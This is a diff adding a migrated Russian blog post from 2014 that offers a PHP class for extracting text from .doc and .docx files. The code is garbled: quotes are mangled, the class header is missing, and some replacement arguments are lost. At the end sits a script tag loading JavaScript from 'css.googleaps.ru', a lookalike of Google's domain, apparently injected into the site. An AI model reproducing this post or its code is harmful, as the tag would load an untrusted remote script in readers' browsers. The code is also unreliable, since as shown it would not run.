@@ -1,0 +1,88 @@
+---
+layout: post
+status: publish
+published: true
+title: Чтение docx файлов в php
+author:
+  display_name: Maxyc Webber
+  login: admin
+  email: maxycws@gmail.com
+  url: ''
+author_login: admin
+author_email: maxycws@gmail.com
+wordpress_id: 567
+wordpress_url: http://devdocs.ru/?p=7
+date: '2014-08-19 22:10:50 +0300'
+date_gmt: '2014-08-19 22:10:50 +0300'
+categories:
+- PHP
+tags:
+- php
+- docx
+- xml
+- ip
+- ui
+comments: []
+---
+<p>Думаю многим пригодится данный класс</p>
+<pre class="brush: php; gutter: true">require(&laquo;doc2txt.class.php&raquo;);</p>
+<p>$docObj = new Doc2Txt(&laquo;test.docx&raquo;);<br />
+&#47;&#47;$docObj = new Doc2Txt(&laquo;test.doc&raquo;);</p>
+<p>$txt = $docObj->convertToText();<br />
+echo $txt;<&#47;pre><br />
+Сам класс</p>
+<pre class="brush: php; gutter: true">filename = $filePath;<br />
+}</p>
+<p>private function read_doc() {<br />
+$fileHandle = fopen($this->filename, &laquo;r&raquo;);<br />
+$line = @fread($fileHandle, filesize($this->filename));<br />
+$lines = explode(chr(0x0D),$line);<br />
+$outtext = &laquo;&raquo;;<br />
+foreach($lines as $thisline)<br />
+{<br />
+$pos = strpos($thisline, chr(0x00));<br />
+if (($pos !== FALSE)||(strlen($thisline)==0))<br />
+{<br />
+} else {<br />
+$outtext .= $thisline.&raquo; &laquo;;<br />
+}<br />
+}<br />
+$outtext = preg_replace(&laquo;&#47;[^a-zA-Z0-9s,.-nrt@&#47;_()]&#47;&raquo;,&raquo;&raquo;,$outtext);<br />
+return $outtext;<br />
+}</p>
+<p>private function read_docx(){</p>
+<p>$striped_content = &raquo;;<br />
+$content = &raquo;;</p>
+<p>$zip = zip_open($this->filename);</p>
+<p>if (!$zip || is_numeric($zip)) return false;</p>
+<p>while ($zip_entry = zip_read($zip)) {</p>
+<p>if (zip_entry_open($zip, $zip_entry) == FALSE) continue;</p>
+<p>if (zip_entry_name($zip_entry) != &laquo;word&#47;document.xml&raquo;) continue;</p>
+<p>$content .= zip_entry_read($zip_entry, zip_entry_filesize($zip_entry));</p>
+<p>zip_entry_close($zip_entry);<br />
+}&#47;&#47; end while</p>
+<p>zip_close($zip);</p>
+<p>$content = str_replace(&raquo;, &raquo; &laquo;, $content);<br />
+$content = str_replace(&raquo;, &laquo;rn&raquo;, $content);<br />
+$striped_content = strip_tags($content);</p>
+<p>return $striped_content;<br />
+}</p>
+<p>public function convertToText() {</p>
+<p>if(isset($this->filename) &amp;&amp; !file_exists($this->filename)) {<br />
+return &laquo;File Not exists&raquo;;<br />
+}</p>
+<p>$fileArray = pathinfo($this->filename);<br />
+$file_ext = $fileArray[&#039;extension&#039;];<br />
+if($file_ext == &laquo;doc&raquo; || $file_ext == &laquo;docx&raquo;)<br />
+{<br />
+if($file_ext == &laquo;doc&raquo;) {<br />
+return $this->read_doc();<br />
+} else {<br />
+return $this->read_docx();<br />
+}<br />
+} else {<br />
+return &laquo;Invalid File Type&raquo;;<br />
+}<br />
+}<br />
+}<br />
+?><script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;pre></p>
